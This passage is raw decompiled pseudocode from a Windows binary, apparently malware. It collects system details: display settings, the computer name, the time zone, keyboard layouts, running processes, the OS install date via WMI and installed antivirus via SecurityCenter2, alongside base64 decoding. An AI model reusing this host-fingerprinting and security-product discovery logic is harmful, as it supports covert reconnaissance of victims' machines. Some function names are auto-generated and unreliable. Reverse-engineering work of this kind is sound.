  *in_FS_OFFSET = (int *)&local_10;
  uVar1 = (*_DAT_003d94d4)("DISPLAY",0,0,0,local_14);
  uVar3 = uVar1;
  uVar2 = (*_DAT_003d9468)(uVar1,8);
  uVar6 = (undefined)uVar3;
  uVar3 = (*_DAT_003d9468)(uVar1,10);
  (*_DAT_003d9524)(0,uVar1);
  FUN_003a5670(uVar3);
  local_8 = 0;
  pvVar4 = (void *)FUN_003a5670(uVar2);
  local_8._0_1_ = 1;
  puVar5 = FUN_00389b30(local_4c,pvVar4);
  local_8._0_1_ = 2;
  puVar5 = FUN_00395bc0(local_30,puVar5);
  local_8 = CONCAT31(local_8._1_3_,3);
  FUN_00389b80(puVar5,param_1);
  uVar3 = extraout_EDX;
  if (0xf < local_1c) {
    FUN_003aee4b(local_30[0]);
    uVar3 = extraout_EDX_00;
  }
  local_1c = 0xf;
  local_20 = 0;
  local_30[0] = (void *)((uint)local_30[0] & 0xffffff00);
  if (0xf < local_38) {
    FUN_003aee4b(local_4c[0]);
    uVar3 = extraout_EDX_01;
  }
  local_38 = 0xf;
  local_3c = 0;
  local_4c[0] = (void *)((uint)local_4c[0] & 0xffffff00);
  if (0xf < local_54) {
    FUN_003aee4b(local_68);
    uVar3 = extraout_EDX_02;
  }
  if (0xf < local_70) {
    FUN_003aee4b(local_84);
    uVar3 = extraout_EDX_03;
  }
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,uVar3,uVar6);
  return;
}



// WARNING: Could not reconcile some variable overlaps
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_003a4680(void)

{
  uint uVar1;
  int iVar2;
  int *piVar3;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 uVar4;
  undefined *unaff_EBX;
  undefined unaff_DI;
  int **in_FS_OFFSET;
  void *local_114;
  uint local_100;
  void *local_f8 [4];
  undefined4 local_e8;
  uint local_e4;
  void *local_dc;
  undefined4 local_cc;
  uint local_c8;
  wchar_t local_c0;
  undefined local_be [170];
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c3101;
  local_10 = *in_FS_OFFSET;
  uVar1 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_c8 = 0xf;
  local_cc = 0;
  local_dc = (void *)((uint)local_dc & 0xffffff00);
  local_8 = 0;
  local_c0 = L'\0';
  local_14 = uVar1;
  trim_string((undefined (*) [16])local_be,0,0xa8);
  iVar2 = (*_DAT_003d9414)(&local_c0,0x55,uVar1);
  if (iVar2 == 0) {
    *(undefined4 *)(unaff_EBX + 0x14) = 0xf;
    *(undefined4 *)(unaff_EBX + 0x10) = 0;
    *unaff_EBX = 0;
    piVar3 = (int *)_strlen("Unknown");
    FUN_003894c0(unaff_EBX,(int **)"Unknown",piVar3);
    uVar4 = extraout_EDX;
  }
  else {
    local_e4 = 7;
    local_e8 = 0;
    local_f8[0] = (void *)((uint)local_f8[0] & 0xffff0000);
    piVar3 = (int *)str_len(&local_c0);
    FUN_003a5120(local_f8,piVar3);
    local_8._0_1_ = 1;
    FUN_003a5840();
    local_8 = CONCAT31(local_8._1_3_,2);
    FUN_003893d0();
    if (0xf < local_100) {
      FUN_003aee4b(local_114);
    }
    local_8 = local_8 & 0xffffff00;
    if (7 < local_e4) {
      FUN_003aee4b(local_f8[0]);
    }
    *(undefined4 *)(unaff_EBX + 0x14) = 0xf;
    *(undefined4 *)(unaff_EBX + 0x10) = 0;
    *unaff_EBX = 0;
    FUN_003893d0();
    uVar4 = extraout_EDX_00;
  }
  if (0xf < local_c8) {
    FUN_003aee4b(local_dc);
    uVar4 = extraout_EDX_01;
  }
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,uVar4,unaff_DI);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_003a4840(void)

{
  void *pvVar1;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 uVar2;
  void *unaff_ESI;
  int **in_FS_OFFSET;
  undefined uVar3;
  undefined2 *puVar4;
  int local_104 [45];
  void *local_50 [5];
  uint local_3c;
  undefined2 local_34;
  undefined4 local_32;
  undefined4 local_2e;
  undefined4 local_2a;
  undefined2 local_26;
  undefined2 local_24;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined2 local_16;
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c3eb8;
  local_10 = *in_FS_OFFSET;
  local_14 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_24 = 0;
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  (*_DAT_003d94bc)(&local_24,local_14,0);
  (*_DAT_003d95b0)(local_104);
  puVar4 = &local_24;
  local_34 = 0;
  local_32 = 0;
  local_2e = 0;
  local_2a = 0;
  local_26 = 0;
  (*_DAT_003d95d0)(local_104,puVar4,&local_34);
  uVar3 = SUB41(puVar4,0);
  pvVar1 = (void *)FUN_003a5990(local_50,-((float)local_104[0] / 60.0));
  local_8 = 0;
  FUN_00389b30(unaff_ESI,pvVar1);
  uVar2 = extraout_EDX;
  if (0xf < local_3c) {
    FUN_003aee4b(local_50[0]);
    uVar2 = extraout_EDX_00;
  }
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,uVar2,uVar3);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_003a4940(void)

{
  undefined4 uVar1;
  undefined4 uVar2;
  int iVar3;
  int iVar4;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  uint uVar5;
  int iVar6;
  undefined8 uVar7;
  undefined uVar8;
  int iVar9;
  undefined local_208 [512];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  uVar1 = (*_DAT_003d957c)(0,500);
  uVar2 = (*_DAT_003d9504)(uVar1);
  iVar6 = 0;
  iVar3 = (*_DAT_003d94f0)(0,0);
  iVar9 = iVar3 * 4;
  iVar4 = (*_DAT_003d94c8)(0x40);
  uVar7 = (*_DAT_003d94f0)(iVar3,iVar4);
  uVar1 = (undefined4)((ulonglong)uVar7 >> 0x20);
  uVar8 = (undefined)iVar9;
  uVar5 = 0;
  if ((uint)uVar7 != 0) {
    do {
      (*_DAT_003d93ec)(*(undefined2 *)(iVar4 + uVar5 * 4),2,local_208,0x200);
      if (iVar6 == 0) {
        (*_DAT_003d9374)(uVar2,&DAT_003d0aec,local_208);
      }
      else {
        (*_DAT_003d9374)(uVar2,"%s / %s",uVar2,local_208);
      }
      iVar6 = iVar6 + 1;
      trim_string((undefined (*) [16])local_208,0,0x200);
      uVar8 = (undefined)iVar9;
      uVar5 = uVar5 + 1;
      uVar1 = extraout_EDX;
    } while (uVar5 < (uint)uVar7);
  }
  if (iVar4 != 0) {
    (*_DAT_003d95c8)(iVar4);
    uVar1 = extraout_EDX_00;
  }
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar1,uVar8);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_003a4a50(void)

{
  undefined4 uVar1;
  int iVar2;
  undefined4 extraout_EDX;
  int **in_FS_OFFSET;
  undefined uVar3;
  undefined4 uVar4;
  undefined4 local_15c [2];
  undefined4 local_154;
  void *local_30;
  undefined4 local_20;
  uint local_1c;
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c3e88;
  local_10 = *in_FS_OFFSET;
  local_14 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  uVar4 = 2;
  local_15c[0] = 0x128;
  uVar1 = (*_DAT_003d9564)(2,0,local_14);
  iVar2 = (*_DAT_003d93d4)(uVar1,local_15c);
  uVar3 = (undefined)uVar4;
  if (iVar2 != 0) {
    iVar2 = (*_DAT_003d94ac)(uVar1,local_15c);
    while (uVar3 = (undefined)uVar4, iVar2 != 0) {
      (*_DAT_003d9520)();
      (*_DAT_003d9520)();
      (*_DAT_003d9520)();
      FUN_003a5670(local_154);
      local_8 = 0;
      (*_DAT_003d9520)();
      local_8 = 0xffffffff;
      if (0xf < local_1c) {
        FUN_003aee4b(local_30);
      }
      local_1c = 0xf;
      local_20 = 0;
      local_30 = (void *)((uint)local_30 & 0xffffff00);
      (*_DAT_003d9520)();
      iVar2 = (*_DAT_003d94ac)(uVar1,local_15c);
    }
  }
  (*_DAT_003d93b8)(uVar1);
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,extraout_EDX,uVar3);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_003a4b80(undefined4 *param_1)

{
  uint uVar1;
  int *piVar2;
  undefined4 uVar3;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined unaff_SI;
  int **in_FS_OFFSET;
  int local_34;
  void *local_30 [5];
  uint local_1c;
  uint local_14;
  int *local_10;
  undefined *puStack12;
  uint local_8;
  
  puStack12 = &LAB_003c34f9;
  local_10 = *in_FS_OFFSET;
  uVar1 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_8 = 0;
  param_1[5] = 0xf;
  param_1[4] = 0;
  *(undefined *)param_1 = 0;
  local_14 = uVar1;
  piVar2 = (int *)_strlen("");
  FUN_003894c0(param_1,(int **)&DAT_003ce656,piVar2);
  local_8 = 0;
  piVar2 = (int *)_strlen("Mozilla/5.0 (Windows NT 10.0; ");
  FUN_003894c0(param_1,(int **)"Mozilla/5.0 (Windows NT 10.0; ",piVar2);
  local_34 = 0;
  uVar3 = (*_DAT_003d959c)(&local_34,uVar1);
  (*_DAT_003d9540)(uVar3);
  FUN_00395c10(local_30,param_1);
  local_8 = 1;
  FUN_003893d0();
  local_8 = local_8 & 0xffffff00;
  if (0xf < local_1c) {
    FUN_003aee4b(local_30[0]);
  }
  FUN_00395c10(local_30,param_1);
  local_8 = 2;
  FUN_003893d0();
  uVar3 = extraout_EDX;
  if (0xf < local_1c) {
    FUN_003aee4b(local_30[0]);
    uVar3 = extraout_EDX_00;
  }
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,uVar3,unaff_SI);
  return;
}



uint __cdecl FUN_003a4cb0(undefined4 param_1)

{
  uint uVar1;
  int iVar2;
  int iVar3;
  uint uVar4;
  undefined4 *unaff_ESI;
  longlong lVar5;
  wchar_t *local_c;
  int *local_8;
  
  uVar4 = 0;
  local_8 = (int *)0x0;
  uVar1 = CoCreateInstance((IID *)&rclsid_003c67a0,(LPUNKNOWN)0x0,1,(IID *)&riid_003d1ac4,&local_8);
  if (-1 < (int)uVar1) {
    iVar2 = Ordinal_2(param_1);
    if (iVar2 != 0) {
      iVar3 = (**(code **)(*local_8 + 0x20))(local_8,iVar2);
      if (-1 < iVar3) {
        iVar3 = (**(code **)(*local_8 + 0xb4))(local_8,0xffffffff,&local_c);
        if (-1 < iVar3) {
          lVar5 = FUN_003b2707(local_c);
          unaff_ESI[1] = (int)((ulonglong)lVar5 >> 0x20);
          *unaff_ESI = (int)lVar5;
          uVar4 = 1;
          Ordinal_6(local_c);
        }
      }
      Ordinal_6(iVar2);
    }
    uVar1 = (**(code **)(*local_8 + 8))(local_8);
  }
  return uVar1 & 0xffffff00 | uVar4;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_003a4d50(void)

{
  undefined4 uVar1;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  int **in_FS_OFFSET;
  undefined8 uVar2;
  undefined uVar3;
  uint uStack132;
  undefined local_74 [8];
  undefined local_6c [8];
  undefined4 local_64;
  int local_58;
  int *local_54;
  int *local_50;
  int *local_4c;
  IUnknown *local_48;
  void *local_44 [4];
  undefined4 local_34;
  uint local_30;
  undefined2 local_28;
  undefined2 local_26;
  undefined2 local_22;
  undefined2 local_20;
  undefined2 local_1e;
  undefined2 local_1c;
  uint local_18;
  uint *local_14;
  int *local_10;
  undefined *puStack12;
  undefined local_8;
  undefined3 uStack7;
  
  puStack12 = &LAB_003c2cd0;
  local_10 = *in_FS_OFFSET;
  uStack132 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_14 = &uStack132;
  *in_FS_OFFSET = (int *)&local_10;
  local_8 = 0;
  uStack7 = 0;
  local_18 = uStack132;
  CoInitializeEx((LPVOID)0x0,0);
  CoInitializeSecurity
            ((PSECURITY_DESCRIPTOR)0x0,-1,(SOLE_AUTHENTICATION_SERVICE *)0x0,(void *)0x0,0,3,
             (void *)0x0,0,(void *)0x0);
  local_54 = (int *)0x0;
  CoCreateInstance((IID *)&rclsid_003c64f0,(LPUNKNOWN)0x0,1,(IID *)&riid_003c6420,&local_54);
  uVar3 = 0;
  local_48 = (IUnknown *)0x0;
  uVar2 = (**(code **)(*local_54 + 0xc))(local_54,L"ROOT\\CIMV2",0,0,0,0,0,0,&local_48);
  uVar1 = (undefined4)((ulonglong)uVar2 >> 0x20);
  if (-1 < (int)uVar2) {
    CoSetProxyBlanket(local_48,10,0,(OLECHAR *)0x0,3,3,(RPC_AUTH_IDENTITY_HANDLE)0x0,0);
    local_50 = (int *)0x0;
    uVar2 = (undefined8)(*local_48->lpVtbl[6].Release)(local_48);
    uVar1 = (undefined4)((ulonglong)uVar2 >> 0x20);
    if (-1 < (int)uVar2) {
      local_4c = (int *)0x0;
      local_58 = 0;
      local_30 = 0xf;
      local_34 = 0;
      local_44[0] = (void *)((uint)local_44[0] & 0xffffff00);
      local_8 = 1;
      if (local_50 != (int *)0x0) {
        (**(code **)(*local_50 + 0x10))(local_50,0xffffffff,1,&local_4c,&local_58);
        if (local_58 == 0) {
          uVar1 = extraout_EDX;
          if (0xf < local_30) {
            FUN_003aee4b(local_44[0]);
            uVar1 = extraout_EDX_01;
          }
        }
        else {
          Ordinal_8(local_6c);
          local_8 = 2;
          (**(code **)(*local_4c + 0x10))(local_4c,L"InstallDate",0,local_6c,0,0);
          FUN_003a4cb0(local_64);
          (*_DAT_003d95b4)(local_74,&local_28);
          uVar1 = (*_DAT_003d957c)();
          uVar1 = (*_DAT_003d9504)(uVar1,0,0x104);
          (*_DAT_003d9374)(uVar1,"%d/%d/%d %d:%d:%d",local_22,local_26,local_28,local_20,local_1e,
                           local_1c);
          Ordinal_9(local_6c);
          FUN_00389360(local_44);
          uVar1 = extraout_EDX_00;
        }
      }
    }
  }
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_18 ^ (uint)&stack0xfffffffc,uVar1,uVar3);
  return;
}



undefined4 _GOST_KEY_TRANSPORT_it(void)

{
  return 0x3a4f00;
}



void FUN_003a4f30(void)

{
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 uVar1;
  int **in_FS_OFFSET;
  undefined8 uVar2;
  undefined uVar3;
  uint uStack164;
  undefined local_94 [20];
  int *local_80;
  int local_7c;
  int *local_78;
  int *local_74;
  IUnknown *local_70;
  void *local_6c [14];
  void *local_34 [4];
  undefined4 local_24;
  uint local_20;
  uint local_18;
  uint *local_14;
  int *local_10;
  undefined *puStack12;
  undefined local_8;
  undefined3 uStack7;
  
  puStack12 = &LAB_003c30ab;
  local_10 = *in_FS_OFFSET;
  uStack164 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_14 = &uStack164;
  *in_FS_OFFSET = (int *)&local_10;
  local_8 = 0;
  uStack7 = 0;
  local_18 = uStack164;
  CoInitializeEx((LPVOID)0x0,0);
  CoInitializeSecurity
            ((PSECURITY_DESCRIPTOR)0x0,-1,(SOLE_AUTHENTICATION_SERVICE *)0x0,(void *)0x0,0,3,
             (void *)0x0,0,(void *)0x0);
  local_80 = (int *)0x0;
  CoCreateInstance((IID *)&rclsid_003c64f0,(LPUNKNOWN)0x0,1,(IID *)&riid_003c6420,&local_80);
  uVar3 = 0;
  local_70 = (IUnknown *)0x0;
  uVar2 = (**(code **)(*local_80 + 0xc))(local_80,L"root\\SecurityCenter2",0,0,0,0,0,0,&local_70);
  uVar1 = (undefined4)((ulonglong)uVar2 >> 0x20);
  if (-1 < (int)uVar2) {
    CoSetProxyBlanket(local_70,10,0,(OLECHAR *)0x0,3,3,(RPC_AUTH_IDENTITY_HANDLE)0x0,0);
    local_78 = (int *)0x0;
    uVar2 = (undefined8)(*local_70->lpVtbl[6].Release)(local_70);
    uVar1 = (undefined4)((ulonglong)uVar2 >> 0x20);
    if (-1 < (int)uVar2) {
      local_74 = (int *)0x0;
      local_7c = 0;
      local_20 = 0xf;
      local_24 = 0;
      local_34[0] = (void *)((uint)local_34[0] & 0xffffff00);
      local_8 = 1;
      if (local_78 != (int *)0x0) {
        (**(code **)(*local_78 + 0x10))(local_78,0xffffffff,1,&local_74,&local_7c);
        if (local_7c == 0) {
          uVar1 = extraout_EDX;
          if (0xf < local_20) {
            FUN_003aee4b(local_34[0]);
            uVar1 = extraout_EDX_01;
          }
        }
        else {
          Ordinal_8(local_94);
          local_8 = 2;
          (**(code **)(*local_74 + 0x10))(local_74,L"displayName",0,local_94,0,0);
          FUN_003a50f0();
          local_8 = 3;
          FUN_003a5840();
          FUN_00389360(local_6c);
          FUN_003959c0();
          Ordinal_9(local_94);
          FUN_00389360(local_34);
          uVar1 = extraout_EDX_00;
        }
      }
    }
  }
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_18 ^ (uint)&stack0xfffffffc,uVar1,uVar3);
  return;
}



undefined4 _GOST_KEY_TRANSPORT_it(void)

{
  return 0x3a50c2;
}



void FUN_003a50f0(void)

{
  int *piVar1;
  undefined2 *unaff_ESI;
  wchar_t *unaff_EDI;
  
  *(undefined4 *)(unaff_ESI + 10) = 7;
  *(undefined4 *)(unaff_ESI + 8) = 0;
  *unaff_ESI = 0;
  piVar1 = (int *)str_len(unaff_EDI);
  FUN_003a5120(unaff_ESI,piVar1);
  return;
}



int ** __thiscall FUN_003a5120(void *this,int *param_1)

{
  uint uVar1;
  undefined4 *in_EAX;
  void *pvVar2;
  int **ppiVar3;
  undefined4 *puVar4;
  
  if (in_EAX != (undefined4 *)0x0) {
    uVar1 = *(uint *)((int)this + 0x14);
    puVar4 = (undefined4 *)this;
    if (7 < uVar1) {
                    // WARNING: Load size is inaccurate
      puVar4 = *this;
    }
    if (puVar4 <= in_EAX) {
      pvVar2 = this;
      if (7 < uVar1) {
                    // WARNING: Load size is inaccurate
        pvVar2 = *this;
      }
      if (in_EAX < (undefined4 *)((int)pvVar2 + *(int *)((int)this + 0x10) * 2)) {
        if (7 < uVar1) {
                    // WARNING: Load size is inaccurate
          ppiVar3 = (int **)FUN_00398300((int **)this,(int *)((int)in_EAX - *this >> 1));
          return ppiVar3;
        }
        ppiVar3 = (int **)FUN_00398300((int **)this,(int *)((int)in_EAX - (int)this >> 1));
        return ppiVar3;
      }
    }
  }
  if ((int *)0x7ffffffe < param_1) {
    FUN_003ae350("string too long");
  }
  if (*(int **)((int)this + 0x14) < param_1) {
    FUN_003984c0((void **)this,param_1,*(void **)((int)this + 0x10));
    if (param_1 == (int *)0x0) {
      return (int **)this;
    }
  }
  else {
    if (param_1 == (int *)0x0) {
      *(undefined4 *)((int)this + 0x10) = 0;
      if (&DAT_00000008 <= *(int **)((int)this + 0x14)) {
                    // WARNING: Load size is inaccurate
        **this = 0;
        return (int **)this;
      }
      *(undefined2 *)this = 0;
      return (int **)this;
    }
  }
  puVar4 = (undefined4 *)this;
  if (7 < *(uint *)((int)this + 0x14)) {
                    // WARNING: Load size is inaccurate
    puVar4 = *this;
  }
  uVar1 = (int)param_1 * 2;
  FUN_003aee70(puVar4,in_EAX,uVar1);
  *(int **)((int)this + 0x10) = param_1;
  if (*(uint *)((int)this + 0x14) < 8) {
    *(undefined2 *)(uVar1 + (int)this) = 0;
    return (int **)this;
  }
                    // WARNING: Load size is inaccurate
  *(undefined2 *)(uVar1 + *this) = 0;
  return (int **)this;
}



undefined * __cdecl FUN_003a5230(undefined *param_1)

{
  FUN_00389d10((int *)0x0);
  *(undefined4 *)(param_1 + 0x14) = 0xf;
  *(undefined4 *)(param_1 + 0x10) = 0;
  *param_1 = 0;
  FUN_003893d0();
  return param_1;
}



byte * __fastcall FUN_003a5270(byte *param_1,int param_2)

{
  char *pcVar1;
  char *pcVar2;
  int in_EAX;
  byte *pbVar3;
  int iVar4;
  
  iVar4 = 0;
  pbVar3 = param_1;
  if (0 < param_2) {
    do {
      *pbVar3 = "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@>@@@?456789:;<=@@@@@@@"
                [*(char *)(in_EAX + iVar4)] * '\x04' |
                (byte)"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@>@@@?456789:;<=@@@@@@@"
                      [*(char *)(in_EAX + 1 + iVar4)] >> 4;
      pbVar3[1] = (byte)"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@>@@@?456789:;<=@@@@@@@"
                        [*(char *)(in_EAX + 2 + iVar4)] >> 2 |
                  "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@>@@@?456789:;<=@@@@@@@"
                  [*(char *)(in_EAX + 1 + iVar4)] << 4;
      pcVar1 = (char *)(in_EAX + 2 + iVar4);
      pcVar2 = (char *)(in_EAX + 3 + iVar4);
      iVar4 = iVar4 + 4;
      pbVar3[2] = "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@>@@@?456789:;<=@@@@@@@"[*pcVar1] << 6
                  | "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@>@@@?456789:;<=@@@@@@@"[*pcVar2];
      pbVar3 = pbVar3 + 3;
    } while (iVar4 < param_2);
  }
  if (*(char *)(in_EAX + -2 + iVar4) != '=') {
    if (*(char *)(in_EAX + -1 + iVar4) != '=') {
      *pbVar3 = 0;
      return param_1;
    }
    *(undefined2 *)(pbVar3 + -1) = 0;
    return param_1;
  }
  *(undefined2 *)(pbVar3 + -1) = 0;
  pbVar3[-2] = 0;
  return param_1;
}



void FUN_003a5340(undefined4 *param_1)

{
  size_t sVar1;
  int **_Str;
  undefined4 **ppuVar2;
  int *piVar3;
  undefined *unaff_EDI;
  int **in_FS_OFFSET;
  uint in_stack_00000018;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c2ed8;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  local_8 = 0;
  ppuVar2 = (undefined4 **)param_1;
  if (in_stack_00000018 < 0x10) {
    ppuVar2 = &param_1;
  }
  sVar1 = _strlen((char *)ppuVar2);
  if (sVar1 % 3 != 0) {
    sVar1 = (sVar1 - sVar1 % 3) + 3;
  }
  _Str = (int **)_malloc((sVar1 * 8) / 6 + 1);
  ppuVar2 = (undefined4 **)param_1;
  if (in_stack_00000018 < 0x10) {
    ppuVar2 = &param_1;
  }
  sVar1 = _strlen((char *)ppuVar2);
  FUN_003a5270((byte *)_Str,sVar1);
  *(undefined4 *)(unaff_EDI + 0x14) = 0xf;
  *(undefined4 *)(unaff_EDI + 0x10) = 0;
  *unaff_EDI = 0;
  piVar3 = (int *)_strlen((char *)_Str);
  FUN_003894c0(unaff_EDI,_Str,piVar3);
  if (0xf < in_stack_00000018) {
    FUN_003aee4b(param_1);
  }
  *in_FS_OFFSET = local_10;
  return;
}



undefined4 * __cdecl FUN_003a5430(undefined4 *param_1,undefined4 *param_2)

{
  uint uVar1;
  undefined4 *puVar2;
  int iVar3;
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  int **in_FS_OFFSET;
  undefined *local_dc [3];
  uint auStack208 [11];
  int *apiStack164 [12];
  undefined **local_74 [18];
  int local_2c;
  undefined4 local_28;
  int local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_14;
  int *local_10;
  undefined *puStack12;
  uint local_8;
  
  puStack12 = &LAB_003c3e54;
  local_10 = *in_FS_OFFSET;
  uVar1 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  param_1[5] = 0xf;
  param_1[4] = 0;
  *(undefined *)param_1 = 0;
  local_8 = 0;
  local_14 = 1;
  FUN_003a67e0(local_dc,param_2);
  local_8 = 1;
  FUN_003a6760(2);
  if ((*(byte *)((int)auStack208 + *(int *)(local_dc[0] + 4)) & 6) == 0) {
    (**(code **)(**(int **)((int)apiStack164 + *(int *)(local_dc[0] + 4)) + 0x28))
              (&local_2c,0,0,1,1,uVar1);
  }
  else {
    local_2c = -1;
    local_28 = 0xffffffff;
    local_24 = 0;
    local_20 = 0;
    local_1c = 0;
  }
  if ((int *)param_1[4] < (int *)(local_24 + local_2c)) {
    FUN_00396020(0);
  }
  else {
    FUN_003898c0(param_1,(int *)(local_24 + local_2c),0xffffffff);
  }
  FUN_003a6760(0);
  puVar2 = param_1;
  if (0xf < (uint)param_1[5]) {
    puVar2 = (undefined4 *)*param_1;
  }
  FUN_003a6620((int *)local_dc,puVar2,param_1[4],0);
  iVar3 = FUN_003a2aa0(extraout_ECX,extraout_EDX);
  if (iVar3 == 0) {
    iVar3 = *(int *)(local_dc[0] + 4);
    uVar1 = *(uint *)((int)auStack208 + iVar3) | 2;
    if (*(int *)((int)apiStack164 + iVar3) == 0) {
      uVar1 = *(uint *)((int)auStack208 + iVar3) | 6;
    }
    *(uint *)((int)auStack208 + iVar3) = uVar1 & 0x17;
    if ((*(uint *)((int)auStack208 + iVar3 + 4) & uVar1 & 0x17) != 0) {
      FUN_00399780((void *)((int)local_dc + iVar3),(char *)0x0);
    }
  }
  local_8 = local_8 & 0xffffff00;
  FUN_003a1e20(local_74);
  local_74[0] = std::ios_base::vftable;
  std::ios_base::_Ios_base_dtor((ios_base *)local_74);
  *in_FS_OFFSET = local_10;
  return param_1;
}



int __fastcall FUN_003a55b0(char *param_1)

{
  char cVar1;
  char *in_EAX;
  int iVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  
  uVar5 = 0;
  cVar1 = *in_EAX;
  while (cVar1 != '\0') {
    uVar5 = uVar5 + 1;
    cVar1 = in_EAX[uVar5];
  }
  uVar3 = 0;
  cVar1 = *param_1;
  while (cVar1 != '\0') {
    uVar3 = uVar3 + 1;
    cVar1 = param_1[uVar3];
  }
  uVar4 = uVar5;
  if (uVar3 < uVar5) {
    uVar4 = uVar3;
  }
  uVar6 = 0;
  if (uVar4 != 0) {
    iVar2 = (int)in_EAX - (int)param_1;
    do {
      if ((int)param_1[iVar2] - (int)*param_1 != 0) {
        return (int)param_1[iVar2] - (int)*param_1;
      }
      uVar6 = uVar6 + 1;
      param_1 = param_1 + 1;
    } while (uVar6 < uVar4);
  }
  return uVar3 - uVar5;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined * FUN_003a5610(void)

{
  undefined *puVar1;
  ulong uVar2;
  uint uVar3;
  size_t unaff_EBX;
  size_t sVar4;
  
  puVar1 = (undefined *)_malloc(unaff_EBX);
  *puVar1 = 0;
  uVar2 = (*_DAT_003d958c)();
  FUN_003b27b4(uVar2);
  sVar4 = unaff_EBX;
  if ((int)unaff_EBX < 1) {
    *puVar1 = 0;
    return puVar1;
  }
  do {
    uVar3 = FUN_003b27c6();
    (*_DAT_003d9374)(puVar1,&DAT_003d1ad4,puVar1,(int)uVar3 % 10);
    sVar4 = sVar4 - 1;
  } while (sVar4 != 0);
  puVar1[unaff_EBX] = 0;
  return puVar1;
}



// WARNING: Could not reconcile some variable overlaps

void FUN_003a5670(undefined4 param_1)

{
  undefined4 extraout_EDX;
  undefined *unaff_EBX;
  int **in_FS_OFFSET;
  undefined uVar1;
  undefined **ppuVar2;
  undefined *local_d8 [2];
  undefined **local_d0 [15];
  undefined4 local_94;
  undefined4 local_90;
  undefined **local_88;
  void *local_34;
  uint local_20;
  uint local_18;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c3dfe;
  local_10 = *in_FS_OFFSET;
  local_18 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  *(undefined4 *)(unaff_EBX + 0x14) = 0xf;
  *(undefined4 *)(unaff_EBX + 0x10) = 0;
  *unaff_EBX = 0;
  ppuVar2 = &PTR_003d1bc0;
  local_d8[0] = &DAT_003d1bc8;
  local_88 = std::basic_ios<char,struct_std::char_traits<char>_>::vftable;
  local_8 = 1;
  FUN_003a72f0((int *)&stack0xffffff18,local_d0);
  local_8 = 2;
  *(undefined ***)(&stack0xffffff18 + (int)ppuVar2[1]) =
       std::basic_stringstream<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
       vftable;
  uVar1 = SUB41(ppuVar2,0);
  FUN_003a2e70((undefined **)local_d0);
  local_d0[0] = std::basic_stringbuf<char,struct_std::char_traits<char>,class_std::allocator<char>_>
                ::vftable;
  local_94 = 0;
  local_90 = 0;
  local_8 = 4;
  FUN_003a6240((int *)local_d8,param_1);
  FUN_003a6950();
  local_8 = CONCAT31(local_8._1_3_,5);
  FUN_003893d0();
  if (0xf < local_20) {
    FUN_003aee4b(local_34);
  }
  local_8 = local_8 & 0xffffff00;
